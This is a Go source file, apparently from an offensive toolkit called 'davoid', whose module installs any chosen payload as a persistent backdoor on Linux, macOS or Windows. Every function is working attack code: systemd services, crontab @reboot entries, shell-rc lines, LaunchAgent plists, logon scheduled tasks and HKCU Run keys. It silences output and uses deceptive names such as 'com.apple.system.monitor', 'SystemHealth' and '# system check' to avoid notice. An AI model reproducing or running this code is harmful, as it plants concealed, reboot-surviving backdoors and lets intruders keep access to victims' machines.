package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/bryanparreira/davoid/internal/modules/ui"
)

func Run() error {
	ui.Header("Persistence Engine — Cross-Platform Backdoor Installation")

	payloadPath := ui.Prompt("Full path to payload/binary to persist")
	if payloadPath == "" {
		return nil
	}

	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		if !ui.Confirm(fmt.Sprintf("'%s' not found. Continue anyway?", payloadPath)) {
			return nil
		}
	}

	payloadPath, _ = filepath.Abs(payloadPath)

	fmt.Printf("\n  %s  %s\n", ui.Cyan.Render("OS"), runtime.GOOS)
	fmt.Printf("  %s  %s\n\n", ui.Cyan.Render("Payload"), payloadPath)

	switch runtime.GOOS {
	case "linux":
		return persistLinux(payloadPath)
	case "darwin":
		return persistMacOS(payloadPath)
	case "windows":
		return persistWindows(payloadPath)
	default:
		ui.Fail(fmt.Sprintf("Unsupported OS: %s", runtime.GOOS))
	}
	return nil
}

func persistLinux(payload string) error {
	method := ui.Select("Persistence Method (Linux)", []string{
		"systemd service     (root required, survives reboot)",
		"crontab @reboot     (user-level, survives reboot)",
		"~/.bashrc entry     (runs on shell login)",
	})
	if method < 0 {
		return nil
	}

	switch method {
	case 0:
		return systemdService(payload)
	case 1:
		return crontabReboot(payload)
	case 2:
		return bashrcEntry(payload)
	}
	return nil
}

func persistMacOS(payload string) error {
	method := ui.Select("Persistence Method (macOS)", []string{
		"LaunchAgent plist   (user-level, survives reboot)",
		"crontab @reboot     (user-level, survives reboot)",
		"~/.zshrc entry      (runs on shell login)",
	})
	if method < 0 {
		return nil
	}

	switch method {
	case 0:
		return launchAgent(payload)
	case 1:
		return crontabReboot(payload)
	case 2:
		return zshrcEntry(payload)
	}
	return nil
}

func persistWindows(payload string) error {
	method := ui.Select("Persistence Method (Windows)", []string{
		"Scheduled Task      (requires admin)",
		"Registry Run key    (HKCU, user-level)",
	})
	if method < 0 {
		return nil
	}

	switch method {
	case 0:
		return scheduledTask(payload)
	case 1:
		return registryRun(payload)
	}
	return nil
}

// ── Linux systemd ─────────────────────────────────────────────────────────────

func systemdService(payload string) error {
	name := ui.PromptDefault("Service name", "davoid-agent")
	unitFile := fmt.Sprintf("/etc/systemd/system/%s.service", name)

	content := fmt.Sprintf(`[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=%s
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, payload)

	if err := os.WriteFile(unitFile, []byte(content), 0644); err != nil {
		ui.Fail(fmt.Sprintf("Write service file failed (need root?): %v", err))
		return nil
	}

	cmds := []string{
		"systemctl daemon-reload",
		fmt.Sprintf("systemctl enable %s", name),
		fmt.Sprintf("systemctl start %s", name),
	}
	for _, c := range cmds {
		parts := strings.Fields(c)
		if err := exec.Command(parts[0], parts[1:]...).Run(); err != nil {
			ui.Warn(fmt.Sprintf("%s: %v", c, err))
		}
	}

	ui.Success(fmt.Sprintf("systemd service '%s' installed and started.", name))
	ui.Info(fmt.Sprintf("Unit file: %s", unitFile))
	ui.PressEnter()
	return nil
}

// ── crontab @reboot ──────────────────────────────────────────────────────────

func crontabReboot(payload string) error {
	// Read existing crontab
	out, _ := exec.Command("crontab", "-l").Output()
	existing := string(out)

	entry := fmt.Sprintf("@reboot %s\n", payload)
	if strings.Contains(existing, payload) {
		ui.Warn("Entry already in crontab.")
		ui.PressEnter()
		return nil
	}

	newCron := existing + entry
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	if err := cmd.Run(); err != nil {
		ui.Fail(fmt.Sprintf("crontab write failed: %v", err))
		return nil
	}

	ui.Success("crontab @reboot entry added.")
	ui.Info(fmt.Sprintf("Entry: %s", strings.TrimSpace(entry)))
	ui.PressEnter()
	return nil
}

// ── ~/.bashrc ────────────────────────────────────────────────────────────────

func bashrcEntry(payload string) error {
	home, _ := os.UserHomeDir()
	bashrc := filepath.Join(home, ".bashrc")

	entry := fmt.Sprintf("\n# system check\n%s &\n", payload)
	f, err := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		ui.Fail(fmt.Sprintf("Cannot write .bashrc: %v", err))
		return nil
	}
	f.WriteString(entry)
	f.Close()

	ui.Success(fmt.Sprintf(".bashrc persistence added: %s", bashrc))
	ui.PressEnter()
	return nil
}

// ── macOS LaunchAgent ─────────────────────────────────────────────────────────

func launchAgent(payload string) error {
	home, _ := os.UserHomeDir()
	label := ui.PromptDefault("Launch agent label", "com.apple.system.monitor")
	plistPath := filepath.Join(home, "Library/LaunchAgents", label+".plist")
	os.MkdirAll(filepath.Dir(plistPath), 0755)

	content := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
`, label, payload)

	if err := os.WriteFile(plistPath, []byte(content), 0644); err != nil {
		ui.Fail(fmt.Sprintf("Write plist failed: %v", err))
		return nil
	}

	exec.Command("launchctl", "load", plistPath).Run()
	ui.Success(fmt.Sprintf("LaunchAgent installed: %s", plistPath))
	ui.PressEnter()
	return nil
}

// ── ~/.zshrc ─────────────────────────────────────────────────────────────────

func zshrcEntry(payload string) error {
	home, _ := os.UserHomeDir()
	zshrc := filepath.Join(home, ".zshrc")
	entry := fmt.Sprintf("\n# system check\n%s &\n", payload)
	f, _ := os.OpenFile(zshrc, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	f.WriteString(entry)
	f.Close()
	ui.Success(fmt.Sprintf(".zshrc persistence added: %s", zshrc))
	ui.PressEnter()
	return nil
}

// ── Windows Scheduled Task ────────────────────────────────────────────────────

func scheduledTask(payload string) error {
	name := ui.PromptDefault("Task name", "SystemHealth")
	args := []string{
		"/Create", "/TN", name,
		"/TR", payload,
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F",
	}
	if err := exec.Command("schtasks", args...).Run(); err != nil {
		ui.Fail(fmt.Sprintf("schtasks failed: %v", err))
		return nil
	}
	ui.Success(fmt.Sprintf("Scheduled task '%s' created.", name))
	ui.PressEnter()
	return nil
}

// ── Windows Registry Run ──────────────────────────────────────────────────────

func registryRun(payload string) error {
	name := ui.PromptDefault("Registry value name", "SystemMonitor")
	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	args := []string{"add", key, "/v", name, "/t", "REG_SZ", "/d", payload, "/f"}
	if err := exec.Command("reg", args...).Run(); err != nil {
		ui.Fail(fmt.Sprintf("reg add failed: %v", err))
		return nil
	}
	ui.Success(fmt.Sprintf("Registry Run key added: %s", name))
	ui.PressEnter()
	return nil
}

